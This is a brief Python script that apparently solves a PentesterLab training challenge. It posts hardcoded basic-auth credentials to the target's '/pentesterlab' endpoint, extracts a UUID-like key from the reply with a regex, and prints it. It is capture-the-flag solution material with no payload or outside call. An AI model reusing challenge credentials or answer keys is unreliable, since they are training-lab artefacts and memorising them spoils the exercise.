#!/usr/bin/python3
import re
import requests
import sys

GREEN = "\033[32m"
RED = "\033[91m"
RESET = "\033[0m"

proxy = {"http": "http://127.0.0.1:8080"}

if len(sys.argv) != 2:
    print(f"Usage:\n\tpython3 {sys.argv[0]} <URL>")
    sys.exit(1)

url = sys.argv[1]
username = "key"
password = "please"

request = requests.post(url + "/pentesterlab", auth=(username, password))
key = re.search(r"[\da-f]*-[\da-f]*-[\da-f]*-[\da-f]*-[\da-f]*", request.text).group()
print(f"[+] The key for this challenge is {GREEN}{key}{RESET}")
